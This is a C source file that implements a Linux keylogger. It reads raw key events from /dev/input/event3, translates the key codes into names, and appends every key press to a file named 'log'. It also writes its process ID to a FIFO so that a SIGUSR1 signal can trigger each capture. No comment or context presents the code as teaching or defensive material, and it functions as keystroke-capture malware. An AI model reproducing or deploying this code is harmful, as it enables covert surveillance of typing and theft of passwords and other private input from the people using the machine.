#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define NUM_EVENTS 128

static char keycodes[][15] = {
	"RESERVED      \n",
	"ESC           \n",
	"1             \n",
	"2             \n",
	"3             \n",
	"4             \n",
	"5             \n",
	"6             \n",
	"7             \n",
	"8             \n",
	"9             \n",
	"0             \n",
	"MINUS         \n",
	"EQUAL         \n",
	"BACKSPACE     \n",
	"TAB           \n",
	"Q             \n",
	"W             \n",
	"E             \n",
	"R             \n",
	"T             \n",
	"Y             \n",
	"U             \n",
	"I             \n",
	"O             \n",
	"P             \n",
	"LEFTBRACE     \n",
	"RIGHTBRACE    \n",
	"ENTER         \n",
	"LEFTCTRL      \n",
	"A             \n",
	"S             \n",
	"D             \n",
	"F             \n",
	"G             \n",
	"H             \n",
	"J             \n",
	"K             \n",
	"L             \n",
	"SEMICOLON     \n",
	"APOSTROPHE    \n",
	"GRAVE         \n",
	"LEFTSHIFT     \n",
	"BACKSLASH     \n",
	"Z             \n",
	"X             \n",
	"C             \n",
	"V             \n",
	"B             \n",
	"N             \n",
	"M             \n",
	"COMMA         \n",
	"DOT           \n",
	"SLASH         \n",
	"RIGHTSHIFT    \n",
	"KPASTERISK    \n",
	"LEFTALT       \n",
	"SPACE         \n",
	"CAPSLOCK      \n",
	"F1            \n",
	"F2            \n",
	"F3            \n",
	"F4            \n",
	"F5            \n",
	"F6            \n",
	"F7            \n",
	"F8            \n",
	"F9            \n",
	"F10           \n",
	"NUMLOCK       \n",
	"SCROLLLOCK    \n",
	"KP7           \n",
	"KP8           \n",
	"KP9           \n",
	"KPMINUS       \n",
	"KP4           \n",
	"KP5           \n",
	"KP6           \n",
	"KPPLUS        \n",
	"KP1           \n",
	"KP2           \n",
	"KP3           \n",
	"KP0           \n",
	"KPDOT         \n",
	"ZENKAKUHANKAKU\n",
	"102ND         \n",
	"F11           \n",
	"F12           \n",
	"RO            \n",
	"KATAKANA      \n",
	"HIRAGANA      \n",
	"HENKAN        \n",
	"KATAKANAHIRAGA\n",
	"MUHENKAN      \n",
	"KPJPCOMMA     \n",
	"KPENTER       \n",
	"KPSLASH       \n",
	"RIGHTCTRL     \n",
	"SYSRQ         \n",
	"LINEFEED      \n",
	"RIGHTALT      \n",
	"HOME          \n",
	"PAGEUP        \n",
	"UP            \n",
	"END           \n",
	"LEFT          \n",
	"RIGHT         \n",
	"PAGEDOWN      \n",
	"DOWN          \n",
	"INSERT        \n",
	"DELETE        \n"
};

char 
	*KEYBOARD_DEVICE = "/dev/input/event3\0",
	*option_input = "log\0", 
	*nme = "pid";
int 	
	writeout = 0,
	keyboard = 0,
	eventSize = 0,
	bytesRead = 0,
	writef = 0;
struct input_event events[NUM_EVENTS];

void sigusr1_handler(int sig) {
	// printf("_\n");
	bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

	for (int it = 0; it < (bytesRead / eventSize); ++it)
		if (events[it].type == EV_KEY) 
			if (events[it].value == 1) 
				write(writeout, keycodes[events[it].code], 15);
}

int main(int argc, char *argv[]) {
	system("echo '' > log");

	writeout = open(option_input, O_WRONLY | O_APPEND | O_CREAT, S_IROTH);
	keyboard = open(KEYBOARD_DEVICE, O_RDONLY);
	
	mkfifo("nme", 0666);

	writef = open("nme", O_WRONLY | O_CREAT);
	pid_t pid = getpid();
	write(writef, (void *)&pid, sizeof(pid));
	// printf("%d\n", pid);
	close(writef);

	eventSize = sizeof(struct input_event);
	bytesRead = 0;

	signal(SIGUSR1, sigusr1_handler);

	while (1) {
		// printf("_\n");
	
	}

	close(keyboard);
	close(writeout);

	return 0;
}
